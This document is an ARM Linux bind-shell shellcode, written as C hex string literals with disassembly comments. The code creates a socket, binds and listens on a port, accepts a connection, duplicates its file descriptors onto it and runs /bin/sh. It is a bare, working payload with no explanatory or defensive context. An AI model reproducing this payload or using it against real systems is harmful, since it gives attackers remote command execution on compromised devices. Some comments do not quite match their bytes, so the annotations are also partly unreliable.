"\x20\x60\x8f\xe2"   /*  add   r6, pc, #32           */
"\x07\x70\x47\xe0"   /*  sub   r7, r7, r7            */
"\x01\x70\xc6\xe5"   /*  strb  r7, [r6, #1]          */
"\x01\x30\x87\xe2"   /*  add   r3, r7, #1            */
"\x13\x07\xa0\xe1"   /*  mov   r0, r3, lsl r7        */
"\x01\x20\x83\xe2"   /*  add   r2, r3, #1            */
"\x07\x40\xa0\xe1"   /*  mov   r4, r7                */
"\x0e\xe0\x4e\xe0"   /*  sub   lr, lr, lr            */
"\x1c\x40\x2d\xe9"   /*  stmfd sp!, {r2-r4, lr}      */
"\x0d\x10\xa0\xe1"   /*  mov   r1, sp                */
"\x66\xff\x90\xef"   /*  swi   0x90ff66     (socket) */
"\x10\x57\xa0\xe1"   /*  mov   r5, r0, lsl r7        */
"\x35\x70\xc6\xe5"   /*  strb  r7, [r6, #53]         */
"\x14\x20\xa0\xe3"   /*  mov   r2, #20               */
"\x82\x28\xa9\xe1"   /*  mov   r2, r2, lsl #17       */
"\x02\x20\x82\xe2"   /*  add   r2, r2, #2            */
"\x14\x40\x2d\xe9"   /*  stmfd sp!, {r2,r4, lr}      */
"\x10\x30\xa0\xe3"   /*  mov   r3, #16               */
"\x0d\x20\xa0\xe1"   /*  mov   r2, sp                */
"\x0d\x40\x2d\xe9"   /*  stmfd sp!, {r0, r2, r3, lr} */
"\x02\x20\xa0\xe3"   /*  mov   r2, #2                */
"\x12\x07\xa0\xe1"   /*  mov   r0, r2, lsl r7        */
"\x0d\x10\xa0\xe1"   /*  mov   r1, sp                */
"\x66\xff\x90\xef"   /*  swi   0x90ff66       (bind) */
"\x45\x70\xc6\xe5"   /*  strb  r7, [r6, #69]         */
"\x02\x20\x82\xe2"   /*  add   r2, r2, #2            */
"\x12\x07\xa0\xe1"   /*  mov   r0, r2, lsl r7        */
"\x66\xff\x90\xef"   /*  swi   0x90ff66     (listen) */
"\x5d\x70\xc6\xe5"   /*  strb  r7, [r6, #93]         */
"\x01\x20\x82\xe2"   /*  add   r2, r2, #1            */
"\x12\x07\xa0\xe1"   /*  mov   r0, r2, lsl r7        */
"\x04\x70\x8d\xe5"   /*  str   r7, [sp, #4]          */
"\x08\x70\x8d\xe5"   /*  str     r7, [sp, #8]          */
"\x66\xff\x90\xef"   /*  swi   0x90ff66     (accept) */
"\x10\x57\xa0\xe1"   /*  mov   r5, r0, lsl r7        */
"\x02\x10\xa0\xe3"   /*  mov   r1, #2                */
"\x71\x70\xc6\xe5"   /*  strb  r7, [r6, #113]        */
"\x15\x07\xa0\xe1"   /*  mov   r0, r5, lsl r7 <dup2> */
"\x3f\xff\x90\xef"   /*  swi   0x90ff3f       (dup2) */
"\x01\x10\x51\xe2"   /*  subs  r1, r1, #1            */
"\xfb\xff\xff\x5a"   /*  bpl   <dup2>                */
"\x99\x70\xc6\xe5"   /*  strb  r7, [r6, #153]        */
"\x14\x30\x8f\xe2"   /*  add   r3, pc, #20           */
"\x04\x30\x8d\xe5"   /*  str     r3, [sp, #4]          */
"\x04\x10\x8d\xe2"   /*  add   r1, sp, #4            */
"\x02\x20\x42\xe0"   /*  sub   r2, r2, r2            */
"\x13\x02\xa0\xe1"   /*  mov   r0, r3, lsl r2        */
"\x08\x20\x8d\xe5"   /*  str   r2, [sp, #8]          */
"\x0b\xff\x90\xef"   /*  swi     0x900ff0b    (execve) */
"/bin/sh"
